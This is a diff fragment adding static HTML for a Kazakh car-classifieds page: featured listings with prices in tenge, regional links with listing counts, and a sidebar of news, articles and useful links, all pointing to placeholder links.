+                                            <div class="spare-parts-hot section-hot hot">
+                                                <div class="clearfix hot-list-hovers" style="display: block;">
+                                                    <div class="hover" style="left: 0px; top: 0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/62/620a5f06-7a90-4c37-bb38-9ffaef5bb3af/1-200x150.jpg" alt="Toyota Camry 2020 за 12 500 000 тг. в Алматы" width="200" height="150" loading="lazy" class="hot-big-img">
+                                                            </picture>
+                                                            <span class="top">Алматы<span class="hot-top-text">8 фото</span></span>
+                                                            <span class="bot">Toyota Camry 2020 &nbsp; <nobr>12,5 млн ₸</nobr></span>
+                                                        </a>
+                                                    </div>
+                                                    <div class="hover" style="left: 130px; top: 0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/5d/5d3678a4-d365-4810-801e-9918d515daf3/1-200x150.jpg" alt="BMW X5 2019 за 18 900 000 тг. в Астана" width="200" height="150" loading="lazy" class="hot-big-img">
+                                                            </picture>
+                                                            <span class="top">Астана<span class="hot-top-text">12 фото</span></span>
+                                                            <span class="bot">BMW X5 2019 &nbsp; <nobr>18,9 млн ₸</nobr></span>
+                                                        </a>
+                                                    </div>
+                                                    <div class="hover" style="left: 260px; top: 0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/1f/1f447e68-dc68-497f-af4e-98ca299158ea/46-200x150.jpg" alt="Mercedes-Benz E-Class 2018 за 15 700 000 тг. в Алматы" width="200" height="150" loading="lazy" class="hot-big-img">
+                                                            </picture>
+                                                            <span class="top">Алматы<span class="hot-top-text">15 фото</span></span>
+                                                            <span class="bot">Mercedes-Benz E-Class 2018 &nbsp; <nobr>15,7 млн ₸</nobr></span>
+                                                        </a>
+                                                    </div>
+                                                    <div class="hover" style="left: 390px; top: 0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/2c/2c3fad44-8bdf-4106-8696-9d9d6f1358bc/1-200x150.jpg" alt="Lexus RX 2021 за 21 300 000 тг. в Астана" width="200" height="150" loading="lazy" class="hot-big-img">
+                                                            </picture>
+                                                            <span class="top">Астана<span class="hot-top-text">10 фото</span></span>
+                                                            <span class="bot">Lexus RX 2021 &nbsp; <nobr>21,3 млн ₸</nobr></span>
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                                
+                                                <div class="hot-list">
+                                                    <div class="hot-item hot-item-0" style="left:0px;top:0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/62/620a5f06-7a90-4c37-bb38-9ffaef5bb3af/1-120x90.jpg" alt="Toyota Camry 2020 за 12 500 000 тг. в Алматы" width="120" height="90" loading="lazy" class="hot-small-img">
+                                                            </picture>
+                                                        </a>
+                                                    </div>
+                                                    <div class="hot-item hot-item-1" style="left:130px;top:0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/5d/5d3678a4-d365-4810-801e-9918d515daf3/1-120x90.jpg" alt="BMW X5 2019 за 18 900 000 тг. в Астана" width="120" height="90" loading="lazy" class="hot-small-img">
+                                                            </picture>
+                                                        </a>
+                                                    </div>
+                                                    <div class="hot-item hot-item-2" style="left:260px;top:0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/1f/1f447e68-dc68-497f-af4e-98ca299158ea/46-120x90.jpg" alt="Mercedes-Benz E-Class 2018 за 15 700 000 тг. в Алматы" width="120" height="90" loading="lazy" class="hot-small-img">
+                                                            </picture>
+                                                        </a>
+                                                    </div>
+                                                    <div class="hot-item hot-item-3" style="left:390px;top:0px;">
+                                                        <a href="#" target="_blank">
+                                                            <picture>
+                                                                <img src="https://cf-kl.kcdn.online/webp/2c/2c3fad44-8bdf-4106-8696-9d9d6f1358bc/1-120x90.jpg" alt="Lexus RX 2021 за 21 300 000 тг. в Астана" width="120" height="90" loading="lazy" class="hot-small-img">
+                                                            </picture>
+                                                        </a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </section>
+
+                                        <!-- Regional links -->
+                                        <section class="region-links-block cities-list" data-test="region-links">
+                                            <div class="section-links">
+                                                <div class="links-block-header clearfix">
+                                                    <h2 class="header-links">Продажа автомобилей в регионах</h2>
+                                                </div>
+                                                <div class="block-links-list row">
+                                                    <ul class="col-sm-3">
+                                                        <li><a href="#">Актау</a>&nbsp;<small>7585</small></li>
+                                                        <li><a href="#">Актобе</a>&nbsp;<small>9149</small></li>
+                                                        <li><a href="#">Алматы</a>&nbsp;<small>45082</small></li>
+                                                        <li><a href="#">Астана</a>&nbsp;<small>21325</small></li>
+                                                        <li><a href="#">Атырау</a>&nbsp;<small>6727</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-3">
+                                                        <li><a href="#">Жанаозен</a>&nbsp;<small>1371</small></li>
+                                                        <li><a href="#">Караганда</a>&nbsp;<small>8757</small></li>
+                                                        <li><a href="#">Кокшетау</a>&nbsp;<small>2793</small></li>
+                                                        <li><a href="#">Костанай</a>&nbsp;<small>4864</small></li>
+                                                        <li><a href="#">Кызылорда</a>&nbsp;<small>3969</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-3">
+                                                        <li><a href="#">Павлодар</a>&nbsp;<small>4370</small></li>
+                                                        <li><a href="#">Петропавловск</a>&nbsp;<small>2685</small></li>
+                                                        <li><a href="#">Семей</a>&nbsp;<small>3734</small></li>
+                                                        <li><a href="#">Талдыкорган</a>&nbsp;<small>2730</small></li>
+                                                        <li><a href="#">Тараз</a>&nbsp;<small>5824</small></li>
+                                                    </ul>
+                                                    <ul class="col-sm-3">
+                                                        <li><a href="#">Туркестан</a>&nbsp;<small>1931</small></li>
+                                                        <li><a href="#">Уральск</a>&nbsp;<small>6344</small></li>
+                                                        <li><a href="#">Усть-Каменогорск</a>&nbsp;<small>5468</small></li>
+                                                        <li><a href="#">Шымкент</a>&nbsp;<small>15572</small></li>
+                                                    </ul>
+                                                </div>
+                                            </div>
+                                        </section>
+                                    </section>
+                                    
+                                    <aside class="col-sm-4">
+                                        <div class="reader" data-test="reader">
+                                            <div class="reader__section">
+                                                <h4 class="reader__heading">
+                                                    <span class="reader__heading-title">
+                                                        <a href="#">Новости</a>
+                                                    </span>
+                                                </h4>
+                                                <div class="reader__records-list">
+                                                    <div class="reader__records-item">
+                                                        <div>
+                                                            <a href="#" class="reader__records-primary-link">
+                                                                <img src="https://cf-kl.kcdn.online/kolesa-read/30b9da3cf3946f24b350f37fa6e75096cdb0c987-230x160.jpg">
+                                                                <span>Культовую Škoda переосмыслили на современный лад</span>
+                                                            </a>
+                                                        </div>
+                                                        <div class="reader__records-item-description">Цифровой прототип 110 R — дорожная машина для любителей автоспорта.</div>
+                                                    </div>
+                                                    <div class="reader__records-item">
+                                                        <a href="#">Китайский бренд расширяет линейку 8-цилиндровых мотоциклов</a>
+                                                    </div>
+                                                    <div class="reader__records-item">
+                                                        <a href="#">Bentley сохранит верность ДВС</a>
+                                                    </div>
+                                                    <div class="reader__records-item">
+                                                        <a href="#">Реплику Lamborghini из старого Nissan создали во Вьетнаме</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="reader__section">
+                                                <h4 class="reader__heading">
+                                                    <span class="reader__heading-title">
+                                                        <a href="#">Статьи</a>
+                                                    </span>
+                                                    <sup class="reader__heading-digit">426</sup>
+                                                </h4>
+                                                <div class="reader__records-list">
+                                                    <div class="reader__records-item">
+                                                        <div>
+                                                            <a href="#" class="reader__records-primary-link">
+                                                                <img src="https://cf-kl.kcdn.online/kolesa-read/78bd8105ff7fac21ab8c6ede7a2a2bf5bce8a0f3-230x160.png">
+                                                                <span>Насколько льготные автокредиты льготные?</span>
+                                                            </a>
+                                                        </div>
+                                                        <div class="reader__records-item-description">Обзор рынка автокредитования в Казахстане. Какие ставки на самом деле предлагают банки.</div>
+                                                    </div>
+                                                    <div class="reader__records-item">
+                                                        <a href="#">Законна ли попытка обложить экосбором все старые машины в Алматы?</a>
+                                                    </div>
+                                                    <div class="reader__records-item">
+                                                        <a href="#">В Узбекистан на автомобиле. А на электромобиле уже тоже можно?</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            
+                                            <div class="reader__section">
+                                                <h4 class="reader__heading">Полезное</h4>
+                                                <div class="reader__useful-link-descr">То, что нужно редко, а когда нужно — не найдешь.</div>
+                                                <ul class="reader__useful-links-list">
+                                                    <li class="reader__useful-links-item">
+                                                        <a class="reader__useful-links-link" href="#">
+                                                            <span class="icon-wrap"><span class="tfi-graph"></span></span>
+                                                            <span class="title">Размеры штрафов</span>
+                                                        </a>
+                                                    </li>
+                                                    <li class="reader__useful-links-item">
+                                                        <a class="reader__useful-links-link" href="#">
+                                                            <span class="icon-wrap"><span class="tfi-surcharge"></span></span>
+                                                            <span class="title">Налог на транспорт</span>
+                                                        </a>
+                                                    </li>
+                                                    <li class="reader__useful-links-item">
+                                                        <a class="reader__useful-links-link" href="#">
+                                                            <span class="icon-wrap"><span class="tfi-wheel"></span></span>
+                                                            <span class="title">Шинный калькулятор</span>
+                                                        </a>
+                                                    </li>
+                                                </ul>
+                                            </div>
